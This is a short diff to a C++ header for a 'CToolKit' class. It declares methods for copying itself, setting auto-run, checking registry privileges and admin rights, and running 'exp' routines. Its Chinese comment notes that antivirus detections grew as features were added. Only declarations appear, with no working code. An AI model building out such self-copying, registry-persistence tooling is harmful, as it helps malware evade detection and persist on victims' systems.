@@ -8,7 +8,6 @@ class CToolKit;
 //采用了简单的协注册表的方法
 //功能写着写着报毒的就多了 Q.Q~
 
-
 typedef  INT(CToolKit::*LPFUNC)(VOID);
 
 class CToolKit
@@ -22,10 +21,11 @@ public:
 
 	int execExp(int order);
 	BOOL copySelf();
-	BOOL setAutoRun();
+
 	BOOL testRegPrivilege();
 	BOOL IsAdmin();
 	BOOL IsKeyEdit();
+	BOOL setAutoRun(PCWSTR szFileFullPath);
 private:
 
 	static LPFUNC funcList[16];
